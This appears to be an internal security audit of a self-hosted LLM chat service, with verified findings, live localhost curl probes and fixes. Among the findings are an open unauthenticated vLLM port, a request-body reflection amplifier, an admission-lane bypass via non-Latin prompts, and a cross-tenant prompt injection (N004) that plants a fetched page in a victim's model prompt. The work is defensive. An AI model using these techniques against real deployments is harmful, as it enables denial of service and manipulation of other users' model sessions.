### N013 — A crafted non-Latin prompt bypasses the LONG admission lane entirely, because admission re-estimates the prompt at 3 chars/token instead of using the exact count fit_request already computed

**P1** · inference-model-registry · `orchestrator/app/admission.py:213` · verdict **FOUND IN VERIFICATION**

*Evidence.* admission.prompt_tokens (admission.py:208-216) decides the lane from `context.estimate_messages` and returns that estimate OUTRIGHT when `estimate < threshold // 2 or estimate > threshold * 2` — the exact /tokenize count is asked for only in the narrow band between 65,536 and 262,144. The estimator is a flat ratio: context.py:56 `_CHARS_PER_TOKEN = 3.0`, context.py:124 `estimate_tokens` = len/3 + 1. For CJK, Devanagari or Gujarati text the true ratio is nearer 1 token per character, so a ~190,000-character Chinese or Gujarati prompt estimates at ~63,300 tokens — just under `threshold // 2` — takes the fast path, and is admitted to the NORMAL lane (capacity 10, admission.py:lane_for + config.py:1465-1466 ADMISSION_LONG_THRESHOLD_TOKENS=131072, ADMISSION_NORMAL_MAX=10) while its real prefill is ~190,000 tokens. The exact count is not unavailable — it is thrown away: every send calls llm._fit -> context.fit_request, which computes `prompt_tokens, served_window = await count_tokens(...)` (context.py:277 and again at :311) and then returns only `(msgs, max_tokens)` (context.py:326-328), after which _primary_send hands the messages to _admission.run, which re-estimates from scratch (llm.

*Impact.* Ten concurrent very-large prefills can be driven into the NORMAL lane at will. That is the exact load shape — concurrent mixed large prefill + decode — that fired the GDN kernel fault on 2026-09-11 and that the LONG lane was built to prevent; per memory, no vLLM build closes the GDN class, so the orchestrator-side lane is the only protection there is. It is reachable today by any signed-in user who pastes a large non-Latin document, and it would be trivially reachable, and repeatable, from a public /v1 surface. The same shortcut is what makes F046's image gap unreachable-but-real and this one reachable.

*Fix.* Have context.fit_request return the exact prompt token count it already has (a third element, or a small dataclass), thread it through llm._fit and _primary_send, and pass it to admission.run so the lane decision uses the exact count and prompt_tokens is never called on the send path. If you want the smaller change first: in admission.prompt_tokens, drop only the LOW half of the shortcut (`estimate < threshold // 2`) so an under-estimate can never skip the exact count, keeping the high half for the obvious-LONG case. Orchestrator container restart only; no model restart. Watch for added /tokenize load on the chat path — that was the 2026-09-05 CPU-bound pre-pass finding — which is precisely why reusing fit_request's existing count is the better of the two fixes.

### F012 — The raw vLLM model API is listening on 0.0.0.0:8000 with no authentication — /v1 on this host is ALREADY an open model endpoint

**P1** · orchestrator-core · `launcher/techsara_cli/cluster.py:83` · verdict **ADJUSTED** · claimed P0 · blocks release

*Evidence.* `DEFAULT_API_BIND_ADDRESS = "0.0.0.0"` (cluster.py:83), assigned to `api_bind` at cluster.py:868/870 and emitted as `CLUSTER_API_BIND_ADDRESS` at cluster.py:901. That value becomes vLLM's own `--host` in compose/compose.cluster-dgx-spark.yaml:40 on a container that is `network_mode: host` (line 33). Live on this machine:

  $ ss -ltn | grep :8000
  LISTEN 0  2048  0.0.0.0:8000  0.0.0.0:*

  $ curl -s -m 6 -o /dev/null -w '%{http_code}' http://127.0.0.1:8000/v1/models
  200
  $ curl -s http://127.0.0.1:8000/v1/models
  {"object":"list","data":[{"id":"Qwen/Qwen3.6-35B-A3B-NVFP4",...,"root":"/models/repos/nvidia--Qwen3.6-35B-A3B-NVFP4--491c2f1ea524",...,"max_model_len":1000000,...}]}

No API key, no allowlist. The same port serves /v1/chat/completions.

*Impact.* Anyone on the 192.168.9.0/22 LAN can drive the 35B model directly at TP=2 — unmetered, unlogged by the orchestrator, outside the admission lanes (app/admission.py's docstring already admits "the second tenant's raw-port traffic is outside these lanes"), outside usage_events, outside the breaker. It also leaks the model id and the on-disk model path. Critically for this build: the /v1 namespace the developer platform wants to own on the public surface is already occupied on this host by an unauthenticated model server, so any documentation or client that says "point at /v1" is one port number away from bypassing every scope, quota and audit the new API adds. (Scope is LAN, not internet — compose/compose.cloudflare.yaml:9-14 maps the tunnel only to frontend:3000 — so this is not internet-exp

*Verification.* Every link in the chain checks out. launcher/techsara_cli/cluster.py:83 `DEFAULT_API_BIND_ADDRESS = "0.0.0.0"`; cluster.py:867-870 `if publish_model_ports: api_bind = DEFAULT_API_BIND_ADDRESS`; cluster.py:901 emits CLUSTER_API_BIND_ADDRESS; compose/compose.cluster-dgx-spark.yaml:33 `network_mode: host` and :40 `--host ${CLUSTER_API_BIND_ADDRESS}`. The deployed values are real: /home/techsphere/Documents/project/personal-LLM-Chabot/.env:73 `PUBLISH_MODEL_PORTS=true`, .runtime/generated.env:22 `CLUSTER_API_BIND_ADDRESS=0.0.0.0`, :217 `VLLM_PORT=8000`. I re-ran it: `curl http://127.0.0.1:8000/v1/models` returns 200 with the model id and `"root":"/models/repos/nvidia--Qwen3.6-35B-A3B-NVFP4--491c2f1ea524"`. `grep -rn 'api.key|API_KEY' compose/*.yaml launcher/techsara_cli/cluster.py` returns ZERO hits, so vLLM is started without --api-key. What I adjust is only the severity: the finding's own impact paragraph already concedes the scope is LAN, and compose/compose.cloudflare.yaml:9-14 confirms the tunnel maps one hostname to frontend:3000 only. An unauthenticated model endpoint that needs LAN/tailnet presence is a P1, not a P0.

*Exploitable today.* yes — any host on the 192.168.9.0/22 LAN or the tailnet can POST /v1/chat/completions and drive the 35B pair at TP=2 outside admission, usage_events and the breaker. No credential, no role, no session needed. Not reachable from the internet.

*Fix.* Smallest correct fix is NOT rebinding. vLLM takes a single --host, and the orchestrator reaches it as `http://vllm:8000/v1` via `extra_hosts: vllm:host-gateway` (the docker bridge gateway address), while the interview-analysis second tenant reaches it over the RoCE address from Node 2 — one bind address cannot serve both, so the proposed bridge-gateway bind would break the second tenant and a RoCE-only bind would break the orchestrator. Instead add a host firewall rule (nftables/iptables) that accepts tcp/8000 only on lo, the docker bridge and the two RoCE links, and drops it on the LAN interface. Do the same for 8002-8005. Then, when the developer platform ships, give the second tenant a scoped key through the orchestrator rather than raw port access.

*Fix risk.* The firewall rule needs no restart of anything — it is the reason to prefer it. The config route (PUBLISH_MODEL_PORTS=false + `techsara up`) regenerates generated.env and restarts the vllm head, i.e. a main-model restart and a production window, and it breaks the second tenant. Test the firewall rule by curling 8000 from a second LAN host before and after.

### F015 — A 422 on POST /chat echoes the ENTIRE request body back to an unauthenticated caller

**P1** · orchestrator-core · `orchestrator/app/main.py:1579` · verdict **CONFIRMED** · blocks release

*Evidence.* `@app.post("/chat")` has no route-level dependency, so Pydantic validates before the in-handler 401 at main.py:1659. FastAPI's default RequestValidationError handler (no override exists — `grep -rn 'exception_handler' orchestrator/app/` returns nothing) includes the offending `input`, and the model-level validator `_require_input` (main.py:770-786) fails with `loc: ["body"]`, so `input` is the WHOLE body. Measured live, no cookie:

  $ python3 -c "import json;print(json.dumps({'messages':[{'role':'assistant','content':'A'*200000}]}))" > probe.json
  $ curl -s -o resp.json -w 'status=%{http_code} upload=%{size_upload} download=%{size_download}\n' \
      -X POST -H 'Content-Type: application/json' --data-binary @probe.json http://127.0.0.1:8080/chat
  status=422 upload=200053 download=200212
  $ head -c 120 resp.json
  {"detail":[{"type":"value_error","loc":["body"],"msg":"Value error, provide a non-empty message/messages, an image, a PDF or a video","input":{"messages":[{"role":"assistant","content":"AAAA...

*Impact.* 200,053 bytes in, 200,212 bytes out, unauthenticated — a >1x reflection amplifier on an endpoint that requires no credentials. Because ChatRequest accepts inline base64 in `pdf`, `image`, `image_base64` and `images` with no length cap, a single malformed request carrying a 10 MB image is answered with a >10 MB JSON error, and the same bytes land in the access log and in any intermediary. For the public /v1 surface this is worse: a customer's prompt or document is reflected verbatim on every validation slip, and a shared logging pipeline then holds it.

*Verification.* I reproduced it byte for byte. `grep -rn 'exception_handler' orchestrator/app/` returns nothing, so FastAPI's default RequestValidationError handler is in force and it includes `input`. The model-level validator main.py:769-786 `_require_input` raises with loc ['body'], so `input` is the whole body. Live, no cookie: `status=422 upload=200053 download=200212`, body starting `{"detail":[{"type":"value_error","loc":["body"],"msg":"Value error, provide a non-empty message/messages, an image, a PDF or a video","input":{"messages":[{"role":"assistant","content":"AAAA...`. The in-handler 401 is at main.py:1668, i.e. after Pydantic, so the echo happens with no credential. ChatRequest declares no max_length on message/messages/pdf/image/images (main.py:627-700), so the amplification scales with the payload.

*Exploitable today.* yes — unauthenticated, from any LAN/tailnet host. >1x reflection amplifier, and the reflected bytes also land in the uvicorn access log.

*Fix.* Register `@app.exception_handler(RequestValidationError)` in main.py that strips `input`: `[{k: v for k, v in e.items() if k != 'input'} for e in exc.errors()]`. ~8 lines. For /v1, put the key-auth dependency on the router (`APIRouter(dependencies=[Depends(require_api_key)])`) so an unauthenticated caller never reaches Pydantic.

*Fix risk.* Orchestrator container restart. Low risk, but the frontend composer may surface `detail[].input` in an error toast — grep frontend/lib and frontend/components for `.input` on a 422 path first. No model restart.

### F016 — No request body size limit anywhere on the orchestrator; an unauthenticated caller's body is fully parsed before the 401

**P1** · orchestrator-core · `orchestrator/Dockerfile:22` · verdict **ADJUSTED** · blocks release

*Evidence.* The uvicorn command line carries no body limit: `CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8080", "--timeout-graceful-shutdown", "90"]`. No middleware checks Content-Length (only middleware is `_reject_cross_site_writes`, main.py:243-253, which reads headers only). ChatRequest declares no `max_length` on any field — `message: Optional[str]`, `messages: Optional[List[ChatMessage]]`, `pdf: Optional[str]`, `images: Optional[List[str]]` (main.py:627-700); the only caps are MAX_IMAGES=5 (main.py:635) and a per-image cap that does not exist for the base64 payload itself. The comment at main.py:632-634 states the intended ceiling as a consequence, not an enforcement: "five 10 MB uploads ≈ 67 MB of payload — a deliberate ceiling". Proven reachable without credentials by the 200 KB probe in the finding above (status 422, upload=200053) — the body was parsed in full before the handler's 401 at main.py:1659 could run.

*Impact.* An unauthenticated LAN caller can make the single-worker event loop allocate and JSON-parse an arbitrarily large body. Because there is only one uvicorn worker (no `--workers`), one such parse stalls every in-flight SSE stream and every health probe on the same loop. For the planned public /v1 with API keys and quotas, a quota that is checked inside the handler is checked after the memory has already been spent.

*Verification.* The fact is right, the file citation is wrong. orchestrator/Dockerfile's own header lines 2-4 say 'SUPERSEDED — the launcher builds Dockerfile.cuda or Dockerfile.cpu; this file is kept only as the rollback path'. But it does not matter: all three carry the same CMD (Dockerfile:76, Dockerfile.cuda:68, Dockerfile.cpu:72) and `docker inspect` on the live container returns `["uvicorn","app.main:app","--host","0.0.0.0","--port","8080","--timeout-graceful-shutdown","90"]` — no --workers, no body limit. There is no Content-Length middleware: the only two middlewares in the app are CORSMiddleware (main.py:225) and `_reject_cross_site_writes` (main.py:243), which reads headers only. `grep -rn 'content-length|max_body|413'` finds 413s ONLY in uploads.py, audio_api.py, video/api.py and artifacts/api.py — never on the /chat JSON body. My own 200 KB probe proved the body is parsed in full before the handler's 401.

*Exploitable today.* yes — unauthenticated LAN/tailnet caller forces the single event loop to allocate and JSON-parse an arbitrary body, stalling every in-flight SSE stream on the same loop.

*Fix.* A ~15-line pure-ASGI middleware (NOT BaseHTTPMiddleware, which buffers and breaks streaming) that reads scope headers, rejects Content-Length > API_MAX_BODY_BYTES with 413 before the receive channel is touched, and is mounted outermost. Add explicit max_length to every string field on the /v1 request models. Cite orchestrator/Dockerfile.cuda:68 rather than orchestrator/Dockerfile:22 in the writeup.

*Fix risk.* Orchestrator container restart. The ceiling must be set above the real inline-base64 path — main.py:632-634 documents five 10 MB uploads ≈ 67 MB — or legitimate multi-image sends start 413ing. No model restart.

### F017 — LiveGeneration.events grows without bound — every SSE frame of every in-flight generation is retained in process memory

**P1** · orchestrator-core · `orchestrator/app/main.py:314` · verdict **CONFIRMED**

*Evidence.* `self.events: List[tuple] = []` (main.py:314) and the only writer is `async def publish(...)`: `self.events.append((event, data))` (main.py:355-357). Nothing ever trims it. `follow()` reads by index (main.py:392-394), so the buffer must survive for replay, and it is freed only when `_finalize_generation` pops the generation from the registry (main.py:575-576) AND no follower holds a reference. The adjacent citation buffer IS capped — `_MAX_STREAM_PIECES = 20000` (main.py:209), applied at main.py:2007-2009 — which shows the author bounded the sibling list and not this one.

*Impact.* Every token frame of a generation is a tuple held for the whole life of the generation. In production GEN_WALL_CLOCK_S is 4,200 s and the NORMAL admission lane admits 10 concurrent generations (config.py:1466), so ten unbounded buffers can accumulate for over an hour in a single-worker process. `/chat/attach` requires the buffer, so it cannot simply be dropped. On the planned /v1 with background jobs and webhooks, generation count per process goes up and this becomes the memory ceiling of the service.

*Verification.* main.py:314 `self.events: List[tuple] = []`; main.py:356 `self.events.append((event, data))` is the only writer; `grep -n 'self\.events' app/main.py` returns exactly 314, 356, 385, 392, 393 — no del, no slice, no clear. follow() (main.py:392-393) reads by index so the buffer must survive for replay, and it is freed only when _finalize_generation pops the generation (main.py:574-576). The sibling IS capped (_MAX_STREAM_PIECES = 20000 at main.py:209, applied at main.py:2008), which makes the omission deliberate-looking. The finding UNDERSTATES the bound: it cites GEN_WALL_CLOCK_S=4200 (.env:146), but config.py:596 calls that a per-CALL hang guard, and config.py:1279-1330 shows continuation_enabled defaults true with continuation_budget_fast/think/max all defaulting to MAX_LOGICAL_OUTPUT_TOKENS = 1_000_000, CONTINUATION_MAX_SEGMENTS = 400, and CONTINUATION_DEADLINE_S = 21_600. All of those segments publish into the SAME LiveGeneration, so one generation can retain on the order of 10^6 token frames over six hours.

*Exploitable today.* yes as a resource issue rather than an attack: any signed-in user asking for a long answer. Ten NORMAL-lane slots × a six-hour run is the worst case, and a deliberate attacker with one account can aim for it.

*Fix.* Cap `events` the way streamed_text is capped: keep the leading meta, a bounded ring of the most recent N frames, and one synthetic frame carrying the concatenated evicted text, so follow() still replays a complete answer. Emit a counter when eviction fires. ~30 lines confined to the LiveGeneration class.

*Fix risk.* Orchestrator container restart. The real risk is /chat/attach: a re-attach after a reload must still rebuild the full partial answer, so the evicted-text frame has to be correct or reloads show truncated answers. Cover it with an attach test against a generation longer than the ring. No model restart.

### F018 — No rate limit, quota or concurrency cap per identity on /chat — one principal can occupy all 10 admission slots

**P1** · orchestrator-core · `orchestrator/app/main.py:1579` · verdict **ADJUSTED** · blocks release

*Evidence.* `grep -n 'Retry-After\|429' app/main.py app/history.py app/uploads.py` returns nothing. The only limiter in the codebase is share_api's, e.g. `if not _rate_ok(_create_hits, principal.user_id, settings.share_create_rate_per_hour, 3600.0): raise HTTPException(429, ...)` (share_api.py:223-227). POST /chat (main.py:1579) applies feature gating (main.py:1683-1693) and the global admission lanes (admission.py:388) but nothing per user: the NORMAL lane is a process-wide `asyncio.Semaphore(settings.admission_normal_max)` with no identity dimension, and `admission_max_waiting` (config.py:1481, default 400) is likewise global.

*Impact.* Any one signed-in account can fill all ten NORMAL slots and 400 waiting positions, and every other user is then refused with `reason="capacity"` ("The model's queue is full right now"). There is no usage ceiling at all: usage_events records consumption after the fact (usage.py:record) but nothing reads it to deny. The developer platform's stated requirement — "API keys with scopes and quotas" — has no enforcement point to hook into today, and no 429 vocabulary or Retry-After convention exists to reuse.

*Verification.* Confirmed with one factual correction. `grep -rn '429|Retry-After' orchestrator/app/*.py` returns breaker.py:45 and resilience.py:364/380/433 (inbound handling of an UPSTREAM 429), share_api.py:227 and :483, AND audio_api.py:177 — so the claim 'the only limiter in the codebase is share_api's' is wrong; voice input has one too. On the chat path itself the claim holds exactly: nothing. admission.py has zero occurrences of user_id or principal (`grep -n 'user_id|principal' app/admission.py` is empty); the lanes are per-event-loop Lanes objects (admission.py:196-202) with a process-wide capacity of 10, and /health confirms `"normal":{"capacity":10}`. usage.py records after the fact and nothing reads it to deny.

*Exploitable today.* yes — one signed-in account can fill all ten NORMAL slots and the 400 waiting positions, and every other user is refused with reason=capacity. Requires only a valid session. See my missed-finding #2: because session_id is unvalidated, a single account can mint unlimited distinct registry keys and so is not even self-limited by the replace-on-same-key behaviour of F020.

*Fix.* A per-principal dict of semaphores in app/admission.py acquired before the global lane, plus a token bucket in the /v1 router dependency returning 429 with Retry-After. Add 'quota' to the closed reason vocabulary in metrics.py so llm_admission_rejections_total can carry it. Validate session_id first (see missed #2) or the per-key dimension is trivially evaded.

*Fix risk.* Orchestrator container restart. A per-user semaphore set too low will make the browser's own multi-tab use fail — pick the limit above what one person's open tabs legitimately need, and make it configurable. No model restart.

### N004 — The bare-API conversation key `u<user_id>-<session_id>` shares a namespace with user-chosen conversation ids, so any signed-in user can pre-claim another user's key and inject content into their prompts

**P1** · orchestrator-core · `orchestrator/app/main.py:1739` · verdict **FOUND IN VERIFICATION**

*Evidence.* main.py:1738-1739 builds the fallback key as `scoped_session = f"u{viewer}-{request.session_id}"` and `conv_key_outer = request.conversation_id or scoped_session`. main.py:2466 rebuilds the same value as `conv_key`. The comment at main.py:1734-1737 says the scoping was added so that 'two callers sending session_id="default" read each other's in-process memory' could no longer happen — but the key it produces lives in the SAME string namespace as client-supplied conversation ids, whose only constraint is `_CONVERSATION_ID_RE = ^[A-Za-z0-9_-]{1,64}$` (main.py:212). The string `u5-default` matches that regex.

Claiming it is unauthenticated-by-design self-service: main.py:1751-1770, when `db.conversation_owner(conversation_id)` returns None, calls `db.create_conversation(viewer, request.conversation_id, title)` and the caller becomes the owner. So user 7 POSTs /chat with `conversation_id: "u5-default"` and owns it.

The per-conversation content stores are then keyed by that string with NO user dimension. Their signatures prove it: db.py:4209 `def get_url_documents(conversation_id: str)`, db.py:4245 `def get_documents(conversation_id: str)`, db.py:3864 `def get_uploads(conversation_id:

*Impact.* Cross-tenant prompt injection. Attacker (any signed-in account) POSTs /chat with conversation_id "u<victim_id>-default" and a URL; the fetched page is stored by engines/url.py under that key. The victim then makes any bare API call — POST /chat with a message and no conversation_id, session_id left at its "default" — and main.py:2603 pulls the attacker's page text into the victim's prompt as a system block the model is told to reference. The same route works for uploaded documents (get_documents), datasets (get_uploads), indexed repos (get_repo_keys) and crawled sites. Victim user ids are small sequential integers, so targeting is trivial. Secondarily, the attacker's send to that conversation cancels the victim's queued chat_requests rows under the same key, denying them a parked answer.



*Fix.* Two independent changes, either of which closes it, and both are cheap:
(1) Put the synthetic key in a namespace client ids cannot reach — make it `f"@session:{viewer}:{request.session_id}"` at main.py:1739 and main.py:3681 (/chat/stop), since '@' and ':' are outside `_CONVERSATION_ID_RE`. This is the smallest correct fix. Note the stop route must change in lockstep or Stop stops matching.
(2) Pass the viewer to the store reads — give get_url_documents / get_documents / get_uploads / get_repo_keys / get_conversation_videos / get_conversation_crawl_sites a user_id parameter and a `AND user_id = %s` predicate, which is the defence that does not depend on the key shape. Add `AND user_id = %s` to db.py:5992 in the same change.
Fix risk: (1) orphans existing rows written under the old synthetic key — acceptable for bare-API sessions, which have no history UI, but confirm no chat_requests resume path depends on the old spelling (db.py:5798 latest_chat_request is by conversation_id). (2) needs a check of every call site. Orchestrator container restart only; no model restart, no production window.

### F076 — The orchestrator serves an unauthenticated OpenAPI schema and Swagger UI (/openapi.json, /docs) on a port bound to all interfaces, enumerating all 94 routes including the entire admin surface

**P2** · admin-usage · `orchestrator/app/main.py:219` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` - docs_url, redoc_url and openapi_url are left at their FastAPI defaults, and no route or middleware gates them (the only middleware is CORS at main.py:225 and `_reject_cross_site_writes` at main.py:243, which only inspects non-GET requests). Verified live against the running production container: `curl -o /dev/null -w '%{http_code} %{size_download}' http://127.0.0.1:8080/openapi.json` -> `200 101718b`; `curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/docs` -> `200`. Parsing the schema yields 94 paths, 34 of them under /admin/api, including `/admin/api/audit`, `/admin/api/members/{user_id}/reset-password`, `/admin/api/members/{user_id}/conversations/{conversation_id}` and `/admin/api/analytics/export`, each with full request/response JSON schemas. `docker ps` reports the orchestrator published as `0.0.0.0:8080->8080/tcp` (docker-compose.yml:555 is `- "8080:8080"` with no bind address, unlike compose.yaml:233 which uses `${TECHSARA_BIND_ADDRESS:-127.0.0.1}`).

*Impact.* Anyone who can reach port 8080 - on the LAN, or through any future tunnel/ingress that forwards it - gets a complete, machine-readable map of every endpoint, parameter and body schema in the product, including the admin and audit surfaces, without authenticating. This directly contradicts the stated design that the admin surface answers 404 so it 'neither confirms its own existence nor which objects exist' (admin_api.py:9-11): the OpenAPI document confirms all of it. It also blocks the plan: the orchestrator already owns /docs and /openapi.json, so a public developer-docs site cannot use those paths on this app without first deciding what happens to Swagger.

*Verification.* The code fact is exactly right. orchestrator/app/main.py:219 is `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` with no docs_url/redoc_url/openapi_url, and `grep -rn 'docs_url|openapi_url|redoc' orchestrator/` returns nothing but two unrelated comment hits. The only two middlewares are CORSMiddleware (main.py:225) and `_reject_cross_site_writes` (main.py:243), which returns early for GET/HEAD/OPTIONS, so neither touches the schema. Live against the running production container: `curl -o /dev/null -w '%{http_code} %{size_download}' http://127.0.0.1:8080/openapi.json` -> `200 101718`, `/docs` -> `200`, and the document parses to 94 paths whose admin entries begin /admin/api/overview, /admin/api/members, /admin/api/members/{user_id}/role, .../status, .../sessions. Nothing in scripts/, orchestrator/tests/ or .github/ consumes the schema, so turning it off breaks no caller.

Two things in the finding are wrong and change the picture. (1) The compose citation: `docker inspect sf-local-ai-orchestrator-1 --format '{{index .Config.Labels "com.docker.compose.project.config_files"}}'` returns compose.yaml + compose/compose.dgx-spark.yaml + compose.published-dgx-spark.yaml + compose.cluster-dgx-spark.yaml. docker-compose.yml is NOT in the deployment chain and is referenced by no script, so `docker-compose.yml:555` is dead text; the 0.0.0.0 bind actually comes from compose.yaml:233 `${TECHSARA_BIND_ADDRESS:-127.0.0.1}:...` resolving against the operator's deliberate `.env:72 TECHSARA_BIND_ADDRESS=0.0.0.0` (annotated at .env:327). The proposed compose edit would fix nothing. (2) Reach: the public internet terminates on the frontend only, and frontend/app/api has no catch-all to the orchestrator root (the closest, /api/admin/[...path], hardcodes the `/admin/api/` prefix at route.ts:107), so /openapi.json is not internet-reachable. That is LAN/tailnet disclosure of route names and body schemas, not an internet exposure, and it hands no credential 

*Exploitable today.* yes, for read-only enumeration — any unauthenticated host on the LAN/tailnet that can reach 10.x:8080. No attacker position exists from the internet: the Cloudflare tunnel fronts the frontend (port 3000) and no frontend route proxies to the orchestrator root.

*Fix.* In orchestrator/app/main.py:219 construct the app as `FastAPI(..., docs_url=None, redoc_url=None, openapi_url=None)` and re-enable the schema only behind an explicit setting (e.g. `settings.expose_openapi`, default False) or a `/internal/openapi.json` route wrapped in `Depends(require_capability(Cap.WORKSPACE_READ))`. For the developer platform, serve a hand-curated /v1 document at /v1/openapi.json and put the public docs page on the Next frontend. Do NOT edit docker-compose.yml for this — it is not in the deploy chain.

*Fix risk.* Near zero: nothing in the repo fetches the schema, and FastAPI's routing is unaffected. Needs an orchestrator container recreate (`docker compose ... up -d orchestrator`), which is a ~30 s service blip; it does NOT touch sf-local-ai-vllm-1 or the worker, so no model restart and no production window beyond the usual deploy.

### F077 — Nav links to /admin/analytics/models, a page that does not exist - the Models board lives on the leaderboards page behind ?tab=models

**P2** · admin-usage · `frontend/app/admin/layout.tsx:137` · verdict **CONFIRMED**

*Evidence.* layout.tsx:136-140 registers `{ href: '/admin/analytics/models', label: 'Models', icon: <IconCpu size={15} /> }` in the Analytics group. `find frontend/app/admin/analytics -name page.tsx` returns exactly ten files: page.tsx, chat, gpu, leaderboards, nodes, performance, research, salesforce, search, voice. There is no `models/` directory, no dynamic segment and no rewrite in next.config.mjs. The Models board is a tab on the leaderboards page: `const [tab, setTab] = useQueryState('tab', 'people'); ... tabs={[{id:'people',...},{id:'models',...}]}` (leaderboards/page.tsx:385, 400-403), so the working URL is /admin/analytics/leaderboards?tab=models.

*Impact.* Every super admin who clicks 'Models' in the admin rail - and the same link in the mobile header, which flattens all items (layout.tsx:331) - gets a Next.js 404 inside the console. It also never renders as active, because `isActive` matches on `pathname.startsWith(item.href)` (layout.tsx:251) and no pathname ever starts with that href. A Developer Platform nav entry added next to it will inherit the same class of bug, since nothing validates that a nav href resolves to a route.

*Verification.* frontend/app/admin/layout.tsx:136-139 registers `{ href: '/admin/analytics/models', label: 'Models', icon: <IconCpu size={15} /> }`. `ls frontend/app/admin/analytics/` returns exactly: chat, gpu, leaderboards, nodes, page.tsx, performance, research, salesforce, search, voice — no `models` directory, no dynamic segment, and next.config.mjs contains only `headers()` (no rewrites). The board really is a tab: frontend/app/admin/analytics/leaderboards/page.tsx:385 `const [tab, setTab] = useQueryState('tab', 'people')`, :386 `const active = tab === 'models' ? 'models' : 'people'`, :402 `{ id: 'models', label: 'Models' }`, fetching `'analytics/models'` at :259. The dead-link claim is also consistent with the active-state logic: layout.tsx:250-251 is `item.exact ? pathname === item.href : pathname.startsWith(item.href)`, and no reachable pathname starts with that href. Note the confusable part the finding gets right by accident: `/admin/api/analytics/models` IS a real orchestrator route (orchestrator/app/authn/analytics_api.py:352) — it is the API the leaderboards tab calls, not a page.

*Exploitable today.* no — it is a broken link, not a security defect. Requires a signed-in super admin to click it; the result is a Next 404 inside the console shell.

*Fix.* frontend/app/admin/layout.tsx:137 -> `href: '/admin/analytics/leaderboards?tab=models'` (and set `exact: false` semantics are already fine since startsWith on the base path will then also light up on the People tab — if that matters, drop the item entirely, since AdminTabs already exposes both boards). Add the suggested vitest that walks navGroups(me) and asserts each href resolves to an app/admin/**/page.tsx.

*Fix risk.* None functional. Frontend-only: needs a Next image rebuild and a frontend container restart; no orchestrator, database or model involvement.

### F078 — The per-member usage table and its CSV export are gated on WORKSPACE_READ (an ordinary admin capability), contradicting rbac.py's stated rule that per-person consumption is super-admin-only

**P2** · admin-usage · `orchestrator/app/authn/admin_api.py:783` · verdict **ADJUSTED** · blocks release

*Evidence.* `@router.get("/analytics")` and `@router.get("/analytics/export")` both take `principal: Principal = Depends(require_capability(Cap.WORKSPACE_READ))` (admin_api.py:783 and 830). `Cap.WORKSPACE_READ` is a member of `_ADMIN_CAPS` (rbac.py:55-64), so `Role.ADMIN` holds it. Both routes return `[_analytics_member_row(r) for r in rows]` built from `store.usage_by_member(...)` - one row per named member with email, role, status, last_active_at, messages, answers, conversations and per-tool counts (admin_api.py:765-776, 821-824). Meanwhile rbac.py:37-42 documents ANALYTICS_READ as 'SUPER_ADMIN only ... per-person consumption is closer to the audit log than to the member list. It is absent from _ADMIN_CAPS deliberately; do not add it there.'

*Impact.* The rule the codebase states about who may see per-person consumption is enforced on one of the two analytics surfaces and not the other: an admin who is deliberately denied the analytics console can still read the same per-person usage breakdown, and download it as a CSV, from /admin/api/analytics and /admin/api/analytics/export. The export at least writes an `analytics_exported` audit event (admin_api.py:846); the read at admin_api.py:781 writes none, so an admin can page through per-member usage with no audit trail at all. For the Developer Platform this is the ambiguity to settle before writing a line: which capability gates who may see another person's API-key traffic.

*Verification.* Every code fact checks out. orchestrator/app/authn/admin_api.py:783 and :830 both read `principal: Principal = Depends(require_capability(Cap.WORKSPACE_READ))`; rbac.py:55-64 puts Cap.WORKSPACE_READ in `_ADMIN_CAPS`, so Role.ADMIN holds it; rbac.py:37-42 says of ANALYTICS_READ 'SUPER_ADMIN only ... per-person consumption is closer to the audit log than to the member list. It is absent from _ADMIN_CAPS deliberately; do not add it there.' Both routes return `[_analytics_member_row(r) for r in rows]` from `store.usage_by_member` (admin_api.py:821, 765-776) — name, email, role, status, last_active_at, messages, answers, conversations, per-tool counts. The audit asymmetry is real: the export calls `audit(..., "analytics_exported", meta={"range": range})` at admin_api.py:844-846; the read route (admin_api.py:780-822) takes no `request` parameter at all and writes nothing. And the 404-on-missing-capability claim is right (principal.py:127-136).

What I adjust is the impact. The same Role.ADMIN already holds `Cap.WORKSPACE_CONTENT_READ` (rbac.py:60), which per rbac.py:31-33 lets them read another member's conversations, uploads and reports outright — and they do so through admin_api.py:374+ and the audited download routes. Message COUNTS are strictly less sensitive than the message BODIES an admin can already read, so this is not a privilege escalation and no data crosses a boundary that was otherwise closed. It is a genuine policy/documentation inconsistency plus one missing audit event, which is a P2, not a confidentiality bug. The finding's framing ('an admin deliberately denied the analytics console can still read the same per-person usage') overstates it.

*Exploitable today.* Not an escalation. Precondition: a valid session for a Role.ADMIN member; they get per-person usage rows with no audit trail. The same principal can already read those members' conversation contents (audited), so the marginal disclosure is small; the marginal loss is the missing trail.

*Fix.* Smallest correct fix, and it is the audit half, not the capability half: give `analytics()` a `request: Request` parameter and add `await db.run_in_thread(audit, principal, request, "analytics_viewed", meta={"range": range})` at orchestrator/app/authn/admin_api.py:780. Then settle the rule deliberately — either re-gate :783/:830 on `Cap.ANALYTICS_READ` (and hide the Overview per-member table for non-super-admins in the frontend) or amend the rbac.py:37-42 comment to say per-person COUNTS are an admin read while the console is not. Whichever you pick, the developer-platform key-usage views must reuse that same Cap.

*Fix risk.* Adding the audit call is inert. Re-gating to ANALYTICS_READ is the risky half: any workspace ADMIN currently using the Overview page would start getting 404s, and the frontend renders that table unconditionally — check frontend/app/admin/page.tsx before flipping it. Orchestrator container recreate only; no model restart, no production window.

### F079 — The two audited admin download routes record a blank user_agent and the proxy container's IP, because the local download proxy forwards only the cookie header

**P2** · admin-usage · `frontend/app/api/admin/[...path]/route.ts:64` · verdict **CONFIRMED**

